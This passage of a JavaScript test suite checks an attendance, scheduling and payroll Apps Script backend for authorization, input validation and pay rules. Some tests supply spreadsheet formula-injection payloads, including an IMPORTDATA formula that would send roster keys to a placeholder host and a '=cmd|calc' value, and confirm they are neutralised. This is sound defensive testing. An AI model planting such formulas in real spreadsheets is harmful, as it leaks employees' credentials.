  ['handleMgrApprove', 'handleMgrDay', 'handleMgrSetActive', 'handleMgrRoster', 'handleMgrAddNotice', 'handleMgrNotices', 'handleMgrDeviceDecision', 'handleMgrPendingDevices', 'handleMgrPendingApprovals', 'handleMgrAddEmployeeUnlocked_']
    .forEach((f) => { const r = sb[f]({ mgr_key: 'OLD', date: '2026-11-02', emp_id: 'E01', periods: [PERIOD('09:00', '13:00')], text: 'x', name: 'y', active: false, device_id: 'D9', approve: true }); assert.strictEqual(r.error, 'unauthorized', f + ' → ' + JSON.stringify(r)); });
});
ok('doPost：action 用 __proto__／constructor／toString／hasOwnProperty 碰不到任何有權限的 handler、不洩漏名冊', () => {
  const m = make({ self: { roster: [ME] } });
  ['__proto__', 'constructor', 'toString', 'hasOwnProperty', 'valueOf'].forEach((a) => {
    const out = m.sb.doPost({ postData: { contents: JSON.stringify({ action: a, admin_key: 'ADM', mgr_key: 'MK' }) } });
    const txt = String(out.__text);
    assert.ok(txt.indexOf('K1') < 0 && txt.indexOf('roster') < 0, a + ' → ' + txt.slice(0, 120));
  });
});

/* ════════════════════════════════════════════════════════════════════════════
 * 第二節：同仁異動／新增同仁／裝置核准／公告
 * ════════════════════════════════════════════════════════════════════════════ */
console.log('\n━━ 第二節：同仁異動、新增同仁、裝置核准、公告 ━━');
ok('mgr_set_active：不能把自己設離職；恢復在職撞同名擋；留痕 removed_at／removed_by＝實際操作人', () => {
  const m = make({ self: { roster: [ME, U2, { emp_id: 'E03', name: '測試二', key: 'K3', active: 'FALSE' }, { emp_id: 'E04', name: '值班主管', key: 'K4', active: 'TRUE' }], managers: [['值班主管', 'MK', 'true', '', ''], ['營運系統', 'SVC', 'true', 'TRUE', '']] } });
  const sb = m.sb;
  assert.strictEqual(sb.handleMgrSetActive({ mgr_key: 'MK', emp_id: 'E04', active: false }).error, 'self_remove');
  assert.strictEqual(sb.handleMgrSetActive({ mgr_key: 'MK', emp_id: 'E03', active: true }).error, 'duplicate_name');
  const r = sb.handleMgrSetActive({ mgr_key: 'SVC', acting_name: '人資小明', emp_id: 'E01', active: 'false' });
  assert.strictEqual(r.ok, true); assert.strictEqual(r.removed_by, '人資小明');
  const row = m.objs('roster')[0];
  assert.strictEqual(String(row.active), 'false'); assert.strictEqual(row.removed_by, '人資小明'); assert.ok(/^2026-11-03T/.test(row.removed_at));
  assert.strictEqual(sb.handleClock({ key: 'K1', type: 'in', device_id: 'D1', lat: 24.78, lng: 121.01 }).error, 'invalid_key');
  assert.strictEqual(sb.handleMgrSetActive({ mgr_key: 'MK', emp_id: 'E01', active: true }).ok, true);
  assert.strictEqual(m.objs('roster')[0].removed_at, '');
});
ok('新增同仁：>20 字擋、與主管同名擋、與在職同名擋（離職同名可以）、= 開頭換全形、兩台同時新增拿不到鎖回 busy', () => {
  const m = make({ self: { roster: [ME, { emp_id: 'E03', name: '離職三', key: 'K3', active: 'FALSE' }] } });
  const sb = m.sb;
  assert.strictEqual(sb.handleMgrAddEmployee({ mgr_key: 'MK', name: 'x'.repeat(21) }).error, 'name_too_long');
  assert.strictEqual(sb.handleMgrAddEmployee({ mgr_key: 'MK', name: '值班主管' }).error, 'self_add');
  assert.strictEqual(sb.handleMgrAddEmployee({ mgr_key: 'MK', name: ' 測試一 ' }).error, 'duplicate_name');
  const a = sb.handleMgrAddEmployee({ mgr_key: 'MK', name: '離職三' });
  assert.strictEqual(a.ok, true); assert.strictEqual(a.emp_id, 'E04');
  assert.strictEqual(sb.handleMgrAddEmployee({ mgr_key: 'MK', name: '+新人' }).name, '＋新人');
  m.sb.__lockBusy = true;
  assert.strictEqual(sb.handleMgrAddEmployee({ mgr_key: 'MK', name: '第五' }).error, 'busy');
  m.sb.__lockBusy = false;
  assert.strictEqual(m.objs('roster').length, 4);
});
/* 8. 管理金鑰的 sync_roster（舊的整批同步）把 name 原樣寫進名冊：= 開頭會被 Sheets 當公式跑，而名冊那張表就放著所有人的打卡鑰匙。
   新路徑 svc_add（管理系統 2026-10-14 起用）已擋 svcFormulaLike_；主管頁 mgr_add_employee 也換全形；只剩這支沒擋。 */
ok('sync_roster 寫名冊：姓名 = + - @ 開頭要換全形（同 sheetSafeText_），不能原樣寫進放鑰匙的那張表', () => {
  const m = make({ self: { roster: [ME] } });
  const r = m.sb.handleSyncRoster({ admin_key: 'ADM', employees: [{ emp_id: 'E07', name: '=IMPORTDATA("https://x.example/?"&JOIN(",",C2:C9))', active: true }, { emp_id: 'E01', name: '+測試一', active: true }] });
  assert.ok(r.ok);
  const names = m.objs('roster').map((x) => String(x.name));
  assert.ok(!names.some((n) => /^[=+\-@]/.test(n)), '寫進名冊的是：' + JSON.stringify(names));
});
ok('裝置核准：沒有待核准事件就不改綁；核准只解裝置這關（店外那張翻成 rejected_out_of_range）；拒絕不改綁', () => {
  const far = { device_id: 'D9' };
  const m = make({ self: { roster: [ME], events: [
    [T('2026-11-02T09:00:00'), 'E01', 'in', 'pending_device_approval', far],
  ] } });
  m.self.sh.events.values[1][6] = false; m.self.sh.events.values[1][5] = 900;   // 這張在店外
  m.self.sh.events.appendRow([iso(T('2026-11-02T18:00:00')), 'E01', 'out', 24.78, 121.01, 3, true, 'D9', false, 'pending_device_approval', 10]);
  const sb = m.sb;
  assert.strictEqual(sb.handleMgrDeviceDecision({ mgr_key: 'MK', emp_id: 'E01', device_id: 'D8', approve: true }).error, 'no_pending_device');
  assert.strictEqual(m.objs('roster')[0].device_id, 'D1');
  const r = sb.handleMgrDeviceDecision({ mgr_key: 'MK', emp_id: 'E01', device_id: 'D9', approve: true });
  assert.strictEqual(r.changed, 2); assert.strictEqual(r.manager_name, '值班主管');
  const ev = m.events();
  assert.strictEqual(ev[0].status, 'rejected_out_of_range'); assert.strictEqual(ev[1].status, 'ok');
  assert.strictEqual(m.objs('roster')[0].device_id, 'D9');
  const m2 = make({ self: { roster: [ME], events: [[T('2026-11-02T09:00:00'), 'E01', 'in', 'pending_device_approval', far]] } });
  assert.strictEqual(m2.sb.handleMgrDeviceDecision({ mgr_key: 'MK', emp_id: 'E01', device_id: 'D9', approve: false }).changed, 1);
  assert.strictEqual(m2.objs('roster')[0].device_id, 'D1'); assert.strictEqual(m2.events()[0].status, 'rejected_device');
});
ok('公告：121 字擋、下架日過去擋、格式怪擋、= 開頭換全形；同仁端 activeNotices 只回 id＋text、過期不回、最多 5 則', () => {
  const m = make({ self: { roster: [ME] } });
  const sb = m.sb;
  assert.strictEqual(sb.handleMgrAddNotice({ mgr_key: 'MK', text: '字'.repeat(121) }).error, 'text_too_long');
  assert.strictEqual(sb.handleMgrAddNotice({ mgr_key: 'MK', text: 'x', ends_on: '2026-11-02' }).error, 'ends_on_past');
  assert.strictEqual(sb.handleMgrAddNotice({ mgr_key: 'MK', text: 'x', ends_on: '11/30' }).error, 'bad_ends_on');
  for (let i = 0; i < 7; i++) { sb.handleMgrAddNotice({ mgr_key: 'MK', text: '公告' + i, ends_on: i === 0 ? '2026-11-03' : '' }); sb.__now += 1000; }
  assert.strictEqual(sb.handleMgrAddNotice({ mgr_key: 'MK', text: '=IMPORTDATA("x")' }).text, '＝IMPORTDATA("x")');
  const list = J(sb.activeNotices(m.self, '2026-11-04'));
  assert.strictEqual(list.length, 5);
  assert.deepStrictEqual(Object.keys(list[0]), ['id', 'text']);
  assert.ok(!list.some((n) => n.text === '公告0'), '過期的還在');
});

/* ════════════════════════════════════════════════════════════════════════════
 * 第三節：舊連結打卡 handleClock／whoami／my_recent
 * ════════════════════════════════════════════════════════════════════════════ */
console.log('\n━━ 第三節：舊連結打卡（clock.html）━━');
const punch = (sb, type, extra) => sb.handleClock(Object.assign({ key: 'K1', type, device_id: 'D1' }, HERE, extra || {}));
ok('第一張卡綁裝置；第二支手機 → pending_device_approval（店外照樣先掛待核准）；type 大寫／空的擋；device_id = 開頭換全形', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [Object.assign({}, ME, { device_id: '' })] } });
  const sb = m.sb;
  assert.strictEqual(punch(sb, 'in', { device_id: '=cmd|calc' }).status, 'ok');
  assert.strictEqual(m.objs('roster')[0].device_id, '＝cmd|calc');
  assert.strictEqual(m.events()[0].device_id, '＝cmd|calc');
  m.sb.__now += 11 * 60000;
  assert.strictEqual(punch(sb, 'out', { device_id: 'OTHER' }).status, 'pending_device_approval');
  assert.strictEqual(punch(sb, 'IN').error, 'bad_type'); assert.strictEqual(punch(sb, '').error, 'bad_type');
  assert.strictEqual(sb.handleWhoami({ key: 'K1', device_id: 'OTHER' }).device_state, 'mismatch');
});
ok('兩支手機同時打第一張卡（都讀到「還沒綁」）：兩張都 ok、名冊綁到後寫的那支——已知取捨，守住「之後第三支會被擋」', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [Object.assign({}, ME, { device_id: '' })] } });
  const sb = m.sb;
  const stale = J(sb.readSheetAsObjects(m.self.sh.roster).rows);
  const a = sb.handleClock(Object.assign({ key: 'K1', type: 'in', device_id: 'PHONE-A' }, HERE), null, stale);
  const b = sb.handleClock(Object.assign({ key: 'K1', type: 'out', device_id: 'PHONE-B' }, HERE), null, stale);
  assert.strictEqual(a.status, 'ok'); assert.strictEqual(b.status, 'ok');
  assert.strictEqual(m.objs('roster')[0].device_id, 'PHONE-B');
  m.sb.__now += 11 * 60000;
  assert.strictEqual(punch(sb, 'in', { device_id: 'PHONE-C' }).status, 'pending_device_approval');
});
ok('同型 10 分鐘鎖：9 分 59 秒擋、10 分整收；跨午夜也算同一個人（23:55 上班、00:03 再上班被擋）', () => {
  const m = make({ now: T('2026-11-03T23:55:00'), self: { roster: [ME] } });
  assert.strictEqual(punch(m.sb, 'in').status, 'ok');
  m.setNow('2026-11-04T00:03:00');
  assert.strictEqual(punch(m.sb, 'in').status, 'rejected_duplicate');
  m.setNow('2026-11-04T00:04:59');
  assert.strictEqual(punch(m.sb, 'in').status, 'rejected_duplicate');
  m.setNow('2026-11-04T00:05:00');
  assert.strictEqual(punch(m.sb, 'in').status, 'ok');
});
ok('whoami／my_recent：離職鑰匙 invalid_key；my_recent 跨年「上月」合計讀得到 12 月；跨夜班歸上班那天、cross 標記', () => {
  const m = make({ now: T('2027-01-05T10:00:00'), self: { roster: [ME, { emp_id: 'E09', name: '走了', key: 'K9', active: 'false' }],
    events: [[T('2026-12-31T23:00:00'), 'E01', 'in'], [T('2027-01-01T02:00:00'), 'E01', 'out']],
    approved: [['2026-12-31', 'E01', '測試一', '23:00-02:00', 3, '正常', '值班主管', '2027-01-01T03:00:00+08:00'], ['2026-12-01', 'E01', '測試一', '09:00-17:00', 8, '正常', '值班主管', '2026-12-01T18:00:00+08:00']] } });
  const sb = m.sb;
  assert.strictEqual(sb.handleWhoami({ key: 'K9' }).error, 'invalid_key');
  assert.strictEqual(sb.handleMyRecent({ key: 'K9' }).error, 'invalid_key');
  const r = J(sb.handleMyRecent({ key: 'K1', device_id: 'D1' }));
  assert.strictEqual(r.month_totals.previous.ym, '2026-12'); assert.strictEqual(r.month_totals.previous.hours, 11);
  assert.strictEqual(r.month_totals.current.ym, '2027-01'); assert.strictEqual(r.month_totals.current.hours, 0);
  const d = r.days.filter((x) => x.date === '2026-12-31')[0];
  assert.deepStrictEqual(d.segments, [{ in: '23:00', out: '02:00', cross: true }]); assert.strictEqual(d.reference, 3); assert.strictEqual(d.approved, 3);
  assert.strictEqual(r.days.some((x) => x.date === '2027-01-01'), false);
});
ok('my_recent 40 天視窗：第 40 天（含今天）回、第 41 天不回；核定 0 小時（全天請假）回 0 不是 null', () => {
  const m = make({ now: T('2026-11-10T10:00:00'), self: { roster: [ME],
    events: [[T('2026-10-01T09:00:00'), 'E01', 'in'], [T('2026-10-01T17:00:00'), 'E01', 'out'], [T('2026-10-02T09:00:00'), 'E01', 'in'], [T('2026-10-02T17:00:00'), 'E01', 'out']],
    approved: [['2026-10-02', 'E01', '測試一', '', 0, '全天請假', '值班主管', '2026-10-02T18:00:00+08:00']] } });
  const r = J(m.sb.handleMyRecent({ key: 'K1' }));
  assert.deepStrictEqual(r.days.map((d) => d.date), ['2026-10-02']);
  assert.strictEqual(r.days[0].approved, 0); assert.strictEqual(r.days[0].approved_status, '全天請假');
});

/* ════════════════════════════════════════════════════════════════════════════
 * 第四節：班表 Sched.gs／SchedPub.gs
 * ════════════════════════════════════════════════════════════════════════════ */
console.log('\n━━ 第四節：班表發布與出勤班表 ━━');
function pubBody(extra) {
  const cells = []; for (let i = 0; i < 28; i++) cells.push(i % 7 === 6 ? { t: 'R' } : { t: 'W', s: 'A' });
  return Object.assign({ svcKey: 'SK', v: 1, store: '', period: 'T01', seq: 1, op_id: 'op-1', start: '2026-11-01', days: 28,
    shifts: [{ id: 'A', name: 'A班', start: '15:00', end: '23:30', break_min: 30 }],
    rows: [{ emp_id: 'E01', name: '測試一', cells: cells, wage: 999, phone: '0900', birthday: '01-01' }] }, extra || {});
}
ok('sched_publish 守門：金鑰錯／v=3／期別 T1／seq 0、1.5／days 27／cells 27 格／op_id 65 字 全部擋；通過的列只存 emp_id、name、cells（薪資電話生日丟掉）', () => {
  const m = make({ props: { SCHED_SVC_KEY: 'SK' } });
  const sb = m.sb;
  assert.strictEqual(sb.handleSchedPublish_(pubBody({ svcKey: 'sk' })).error, 'unauthorized');
  assert.strictEqual(sb.handleSchedPublish_(pubBody({ v: 3 })).error, 'bad_version');
  assert.strictEqual(sb.handleSchedPublish_(pubBody({ period: 'T1' })).error, 'bad_input');
  assert.strictEqual(sb.handleSchedPublish_(pubBody({ seq: 0 })).error, 'bad_input');
  assert.strictEqual(sb.handleSchedPublish_(pubBody({ seq: 1.5 })).error, 'bad_input');
  assert.strictEqual(sb.handleSchedPublish_(pubBody({ days: 27 })).error, 'bad_input');
  const short = pubBody(); short.rows[0].cells.pop();
  assert.strictEqual(sb.handleSchedPublish_(short).error, 'bad_input');
  assert.strictEqual(sb.handleSchedPublish_(pubBody({ op_id: 'x'.repeat(65) })).error, 'bad_input');
  assert.deepStrictEqual(J(sb.handleSchedPublish_(pubBody())), { ok: true, seq: 1 });
  const stored = JSON.parse(m.rows('sched_pub')[0][3]);
  assert.deepStrictEqual(Object.keys(stored.rows[0]), ['emp_id', 'name', 'cells']);
  assert.ok(JSON.stringify(stored).indexOf('0900') < 0);
});
ok('seq／op_id／墓碑：同 op_id 重送回上次結果不寫；seq 較小 stale；unpublish 後舊 seq 的 publish 不會復活；超過 45,000 字 too_big', () => {
  const m = make({ props: { SCHED_SVC_KEY: 'SK' } });
  const sb = m.sb;
  sb.handleSchedPublish_(pubBody());
  assert.deepStrictEqual(J(sb.handleSchedPublish_(pubBody({ seq: 9 }))), { ok: true, seq: 1 });   // 同 op_id → 冪等，不升 seq
  assert.strictEqual(m.rows('sched_pub').length, 1);
  assert.deepStrictEqual(J(sb.handleSchedPublish_(pubBody({ seq: 1, op_id: 'op-2' }))), { ok: false, error: 'stale', seq: 1 });
  assert.deepStrictEqual(J(sb.handleSchedUnpublish_({ svcKey: 'SK', v: 1, store: '', period: 'T01', seq: 3, op_id: 'op-3' })), { ok: true, seq: 3 });
  assert.strictEqual(m.rows('sched_pub')[0][3], '');
  assert.strictEqual(sb.handleSchedPublish_(pubBody({ seq: 2, op_id: 'op-4' })).error, 'stale');
  assert.deepStrictEqual(J(sb.schedPubLoad_()), {});
  const big = pubBody({ seq: 4, op_id: 'op-5' }); big.rows[0].name = 'x'.repeat(46000);
  assert.strictEqual(sb.handleSchedPublish_(big).error, 'too_big');
  assert.strictEqual(m.rows('sched_pub').length, 1);
});
ok('備註：期外日期丟掉、61 字截 60、空白不存；站別 id 截 32、name 截 20；分段班格式錯整個不收', () => {
  const m = make({ props: { SCHED_SVC_KEY: 'SK' } });
  const b = pubBody({ v: 2, notes: [{ d: '2026-11-01', lunch: '雞'.repeat(61), dinner: '  ' }, { d: '2026-11-29', lunch: '期外' }, { d: '2026-11-28', dinner: '最後一天' }, { d: 'x' }],
    stations: [{ id: 's'.repeat(40), name: 'n'.repeat(30) }, { id: '', name: 'x' }] });
  b.shifts[0].segs = [{ start: '15:00', end: '18:00', break_min: 0 }, { start: '19:00', end: '2330', break_min: 0 }];
  assert.ok(m.sb.handleSchedPublish_(b).ok);
  const st = JSON.parse(m.rows('sched_pub')[0][3]);
  assert.deepStrictEqual(st.notes, { '2026-11-01': { lunch: '雞'.repeat(60) }, '2026-11-28': { dinner: '最後一天' } });
  assert.deepStrictEqual(st.stations, [{ id: 's'.repeat(32), name: 'n'.repeat(20) }]);
  assert.strictEqual(st.shifts[0].segs, undefined);
});
/** 出勤班表的沙盒：把 lineHubMine_（名冊對人）換成固定名單，Gist 固定回空（只測營運系統發布那條） */
function schedCtx(mine, extra) {
  const m = make(Object.assign({ hub: true, now: T('2026-11-10T12:00:00'), props: { SCHED_SVC_KEY: 'SK', SCHED_STORE_FROM: '2026-11-01' },
    fetch: (url) => (String(url).indexOf('gist') >= 0 ? { getResponseCode: () => 200, getContentText: () => JSON.stringify({ mala_employees: [], mala_locks: [] }) } : null) }, extra || {}));
  m.sb.lineHubMine_ = (uid, info) => mine;
  m.sb.lineHubThrottled_ = () => false;
  return m;
}
ok('出勤班表：只看自己綁定那家店的列——別店發布了同一個 emp_id 也看不到；月份超出上月／本月／下月回 bad_month', () => {
  const m = schedCtx([{ st: { code: 'mztjs' }, row: { emp_id: 'E01', name: '測試一' } }]);
  const sb = m.sb;
  assert.ok(sb.handleSchedPublish_(pubBody()).ok);                                       // 光復（store ''）發布了 E01 的班
  const r = J(sb.handleLineHubSched_({ id_token: 'TOK_U1', ym: '2026-11' }));
  assert.strictEqual(r.status, 'not_locked', JSON.stringify(r).slice(0, 200));          // 他綁的是金山，金山沒發布
  assert.ok(sb.handleSchedPublish_(pubBody({ store: 'mztjs', op_id: 'op-js' })).ok);
  const r2 = J(sb.handleLineHubSched_({ id_token: 'TOK_U1', ym: '2026-11' }));
  assert.strictEqual(r2.status, 'ready'); assert.strictEqual(r2.days[0].label, 'A班'); assert.strictEqual(r2.days[0].hours, 8); assert.strictEqual(r2.days[6].label, '例假');
  assert.strictEqual(r2.summary.work_days, 24);
  assert.strictEqual(sb.handleLineHubSched_({ id_token: 'TOK_U1', ym: '2026-09' }).error, 'bad_month');
  assert.strictEqual(sb.handleLineHubSched_({ id_token: 'TOK_U1', ym: '2026-1' }).error, 'bad_month');
  assert.strictEqual(sb.handleLineHubSched_({ id_token: 'TOK_X', ym: '2026-11' }).error, 'invalid_id_token');
});
ok('接手日切在月中（SCHED_STORE_FROM=2026-11-15）：15 日前留白、15 日起讀發布；12 月整月發布還沒到就標「尚未發布」', () => {
  const m = schedCtx([{ st: { code: '' }, row: { emp_id: 'E01', name: '測試一' } }], { props: { SCHED_SVC_KEY: 'SK', SCHED_STORE_FROM: '2026-11-15' } });
  const sb = m.sb;
  assert.ok(sb.handleSchedPublish_(pubBody()).ok);
  const r = J(sb.handleLineHubSched_({ id_token: 'TOK_U1', ym: '2026-11' }));
  assert.strictEqual(r.status, 'ready');
  assert.strictEqual(r.days[13].label, ''); assert.strictEqual(r.days[13].pending, undefined);
  assert.strictEqual(r.days[14].label, 'A班');
  assert.strictEqual(r.summary.work_days, 12);   // 15～28 共 14 天，扣掉 21、28 兩個例假
  assert.strictEqual(sb.handleLineHubSched_({ id_token: 'TOK_U1', ym: '2026-12' }).status, 'not_locked');   // 12 月沒有任何一期發布
  const t2 = pubBody({ period: 'T02', start: '2026-11-29', op_id: 'op-t2' });
  assert.ok(sb.handleSchedPublish_(t2).ok);
  const r2 = J(sb.handleLineHubSched_({ id_token: 'TOK_U1', ym: '2026-12' }));
  assert.strictEqual(r2.status, 'ready'); assert.strictEqual(r2.days[0].label, 'A班');
  assert.strictEqual(r2.days[26].label, '尚未發布'); assert.strictEqual(r2.days[26].pending, true);   // 12-27 起是 T03，還沒發布：明講不留白
  assert.strictEqual(r2.days[30].pending, true);
});
ok('sched_day_roster：沒設 SCHED_READ_KEY 一律 unauthorized；只回姓名＋時段（沒有 emp_id／工時）；日期早於接手日回 source gist', () => {
  const m = schedCtx([], { props: { SCHED_SVC_KEY: 'SK', SCHED_STORE_FROM: '2026-11-01' } });
  const sb = m.sb;
  sb.handleSchedPublish_(pubBody());
  assert.strictEqual(sb.handleSchedDayRoster_({ key: 'SK', date: '2026-11-02' }).error, 'unauthorized');   // 發布鑰匙不能拿來讀
  m.props.SCHED_READ_KEY = 'RK';
  assert.strictEqual(sb.handleSchedDayRoster_({ key: ['RK'], date: '2026-11-02' }).error, 'unauthorized');
  const r = J(sb.handleSchedDayRoster_({ key: 'RK', date: '2026-11-02' }));
  assert.deepStrictEqual(r.people, [{ name: '測試一', label: 'A班', segs: [['15:00', '23:30']] }]);
  assert.strictEqual(J(sb.handleSchedDayRoster_({ key: 'RK', date: '2026-11-07' })).people.length, 0);   // 例假
  assert.strictEqual(sb.handleSchedDayRoster_({ key: 'RK', date: '2026-10-31' }).source, 'gist');
  assert.strictEqual(sb.handleSchedDayRoster_({ key: 'RK', date: '2026-11-31' }).published, false);
});

/* ════════════════════════════════════════════════════════════════════════════
 * 第五節：薪資 Payroll.gs
 * ════════════════════════════════════════════════════════════════════════════ */
console.log('\n━━ 第五節：薪資（payCollect／payCalcOne／出勤紀錄表／附件／特休／補休帳）━━');
const CFG = { daily_hours: 8, attend_deduct_per_day: 100, late_deduct: 'true', late_div_days: 30, late_div_hours: 8, leave_div_days: 30, leave_div_hours: 8, pt_tenure_plus: 10, pt_tenure_months: 6, pt_attend_plus: 10, pt_attend_min_hours: 100 };
const PT = (hire) => ({ emp_id: 'P1', name: '計時一', is_full_time: 'false', wage: 200, hire_date: hire, active: 'true', store: 'SSLGF' });

/* 5. 計時年資加給：「滿 N 個月之後的次月」用 new Date(y, m+6, d) 算到期日，月底到職會溢位到下個月：
   8/31 到職 → 滿半年算成 3/2（應為 2/28）→ 3 月 1 號不「晚於」3/2 → 3 月拿不到、4 月才有；10/31 → 4/31＝5/1 → 5 月拿不到。
   少的那個月：100 小時 × 10 元＝1,000 元。 */
ok('計時年資加給：8/31 到職應從隔年 3 月起加 10 元（10/31 → 5 月、3/31 → 10 月），月底到職不能晚一個月', () => {
  const m = make();
  const plus = (hire, ym) => m.sb.payTenurePlus(PT(hire), ym, CFG);
  assert.strictEqual(plus('2026-08-28', '2027-03'), 10);
  assert.strictEqual(plus('2026-08-31', '2027-03'), 10, '8/31 到職 3 月拿不到');
  assert.strictEqual(plus('2026-10-31', '2027-05'), 10, '10/31 到職 5 月拿不到');
  assert.strictEqual(plus('2026-03-31', '2026-10'), 10, '3/31 到職 10 月拿不到');
});
ok('（對照）計時年資加給正常例：6/5 到職 → 隔年 1 月起；12 月沒有；門檻 0 當沒設（用 6）；金額 0＝不給', () => {
  const m = make();
  const plus = (hire, ym, cfg) => m.sb.payTenurePlus(PT(hire), ym, cfg || CFG);
  assert.strictEqual(plus('2026-06-05', '2026-12'), 0); assert.strictEqual(plus('2026-06-05', '2027-01'), 10);
  assert.strictEqual(plus('2026-06-05', '2027-01', Object.assign({}, CFG, { pt_tenure_months: 0 })), 10);
  assert.strictEqual(plus('2026-06-05', '2027-01', Object.assign({}, CFG, { pt_tenure_plus: 0 })), 0);
  const r = J(m.sb.payCalcOne(PT('2026-06-05'), '2027-01', { hours: 100 }, CFG, 0, null));
  assert.strictEqual(r.gross, 21000);
  assert.deepStrictEqual(r.earn.map((x) => x.item_key), ['hourly_wage', 'pt_tenure_plus']);
});
/* 6. 特休週年期同樣用 setMonth 溢位：8/31 到職的「滿 6 個月」起點算成 3/3（應 2/28），3/1、3/2 請的特休不算已用 → 剩餘特休多算 → 折算工資多發。 */
ok('特休週年期：8/31 到職的半年期應從 2/28（或 3/1）起算，3/1 請的特休要算進已用', () => {
  const FT = { emp_id: 'F1', name: '正職一', is_full_time: 'true', base: 30000, hire_date: '2026-08-31', active: 'true', store: 'SSLGF' };
  const m = make({ pay: { master: [FT], store: [{ code: 'SSLGF', name: '甲', active: 'true', clock_ss_id: '' }] },
    self: { roster: [{ emp_id: 'F1', name: '正職一', key: 'KF', active: 'TRUE' }], leave: [['2027-03-01', '正職一', '特休假', 8]] } });
  const a = J(m.sb.payAnnualInfo('2027-03', 'SSLGF')).F1;
  assert.strictEqual(a.days, 3);
  assert.strictEqual(a.used_h, 8, '週年期起點 ' + a.ps + '，3/1 的特休沒算進去');
});
ok('payCollect 狀態字串解析：「主管認定不計遲到」不算缺勤；「早退3分、遲到2分」兩項都抓；第N段缺卡算忘刷張數；休息補登申請核准後兩張只算一次', () => {
  const m = make({ self: { roster: [ME], approved: [
    ['2026-11-01', 'E01', '測試一', '09:00-17:00', 8, '主管認定不計遲到', '值班主管', '2026-11-01T18:00:00+08:00'],
    ['2026-11-02', 'E01', '測試一', '09:00-17:00', 8, '早退3分、遲到2分', '值班主管', '2026-11-02T18:00:00+08:00'],
    ['2026-11-03', 'E01', '測試一', '09:00-12:00,13:00-17:00', 7, '第一段下班無打卡、第二段上班無打卡', '值班主管', '2026-11-03T18:00:00+08:00'],
    ['2026-11-04', 'E01', '測試一', '09:00-12:00,13:00-17:00', 7, '第一段下班無打卡、第二段上班無打卡', '值班主管', '2026-11-04T18:00:00+08:00'],
  ], requests: [['id', 'created_at', 'emp_id', 'name', 'kind', 'date', 'leave_type', 'start', 'end', 'hours', 'miss_type', 'reason', 'attach_id', 'status', 'decided_at', 'decided_by', 'reject_reason', 'seen_at', 'comp'],
    ['r1', '2026-11-04T19:00:00+08:00', 'E01', '測試一', 'miss', '2026-11-04', '', '12:00', '13:00', '', 'break', '忘了', '', 'approved', '', '', '', '', '']] } });
  const c = J(m.sb.payCollect('2026-11', 6, 'SSLGF', [], null)).E01;
  assert.strictEqual(c.deduct_days, 3);   // 11-02 遲到早退、11-03、11-04 忘刷；11-01 不算
  assert.strictEqual(c.late_min, 2); assert.strictEqual(c.early_min, 3);
  assert.strictEqual(c.forget_punch, 3);  // 11-03 兩張＋11-04 一組算 1
  assert.strictEqual(c.forget_day, 2);
});
ok('payCollect 請假：日期被 Sheets 轉成日期物件也對得到；姓名不在名冊的列忽略；出差時數留白＝整天不算餐費日', () => {
  const m = make({ autoDate: true, self: { roster: [ME], approved: [['2026-11-05', 'E01', '測試一', '09:00-18:00', 9, '正常', '值班主管', '2026-11-05T19:00:00+08:00']] } });
  m.self.sh.leave.appendRow(['2026-11-05', '測試一', '事假', 2]);
  m.self.sh.leave.appendRow(['2026-11-05', '不存在', '事假', 8]);
  m.self.sh.leave.appendRow(['2026-11-05', '測試一', '出差', '']);
  assert.ok(m.rows('leave')[0][0] instanceof m.sb.Date, '沙盒沒模擬到日期物件');
  const c = J(m.sb.payCollect('2026-11', 6, 'SSLGF', [], null)).E01;
  assert.strictEqual(c.personal_h, 2); assert.strictEqual(c.deduct_days, 1); assert.strictEqual(c.work_days, 0);
});
ok('payCalcOne 正職：淨時數口徑（上班＋可抵扣假−基本）、不足倒扣、全勤遞減、天災假不扣全勤；數值欄一律 payNum 過（字串時數不會變成字串相接）', () => {
  const m = make();
  const FT = { emp_id: 'F1', name: '正職一', is_full_time: 'true', base: 30000, ot_rate: 200, attend_cap: 2000, hire_date: '2026-01-01', active: 'true' };
  const lt = J(m.sb.payLeaveTypes(''));
  const r = J(m.sb.payCalcOne(FT, '2026-11', { hours: 170, personal_h: 8, deduct_days: 1, late_min: 10 }, CFG, 8, lt));   // baseH 176
  const by = {}; r.earn.concat(r.ded).forEach((x) => { by[x.item_key] = x; });
  assert.strictEqual(r.base_hours, 176); assert.strictEqual(r.surplus_hours, -6);
  assert.strictEqual(by.overtime.qty, 2);              // 170 + 8（事假可抵）− 176 ＝ +2 → 加班 2H
  assert.strictEqual(by.shortfall_hours, undefined);
  assert.strictEqual(by.attend_bonus.amount, 1900);    // 2000 − 1 天 × 100
  assert.strictEqual(by.personal_leave.amount, 1064);  // (30000+2000)/30/8 ＝ 133（取整）× 8H
  assert.strictEqual(by.late_deduct.amount, 22);       // (30000+全勤2000)/30/8/60 × 10 分 ＝ 22.2 → 22（2026-10 起基數含全勤）
  assert.strictEqual(r.gross, 32300);
  // 引擎本身不 payNum（'170' + 0 ＝ '1700' → 加班 1,532 小時＝30 萬）；唯一的呼叫端 handlePayrollCalc 每個數值欄都先 payNum，守住這條
  const str = J(m.sb.payCalcOne(FT, '2026-11', { hours: '170' }, CFG, 8, lt));
  assert.ok(str.surplus_hours > 1000, '引擎已自己 payNum 了，可把這段改成正向斷言');
  assert.ok(/payNum\(o\.hours\)\s*:\s*payNum\(c\.hours\)/.test(SRC.pay), 'handlePayrollCalc 不再對 hours 做 payNum');
});

/** 薪資＋打卡的沙盒：門市表 SSLGF（本表）＋ CF（別店 peer 試算表）；requests 表頭照 Requests.gs */
const REQH = ['id', 'created_at', 'emp_id', 'name', 'kind', 'date', 'leave_type', 'start', 'end', 'hours', 'miss_type', 'reason', 'attach_id', 'status', 'decided_at', 'decided_by', 'reject_reason', 'seen_at', 'comp', 'voided_at', 'voided_by', 'void_reason'];
const reqRow = (o) => REQH.map((h) => (o[h] === undefined ? '' : o[h]));
function payCtx(extra) {
  extra = extra || {};
  const m0 = { book: null };
  const m = make(Object.assign({
    now: T('2026-11-20T10:00:00'),
    props: { REQ_ATTACH_FOLDER: 'FOLDER' },
    drive: { F1: { parent: 'FOLDER', mime: 'image/png' }, F2: { parent: 'ELSEWHERE', mime: 'image/png' }, F3: { parent: 'FOLDER', mime: 'application/pdf' } },
    pay: Object.assign({
      store: [{ code: 'SSLGF', name: '甲店', active: 'true', clock_ss_id: '' }, { code: 'CF', name: '乙廚', active: 'true', clock_ss_id: 'CFSS' }],
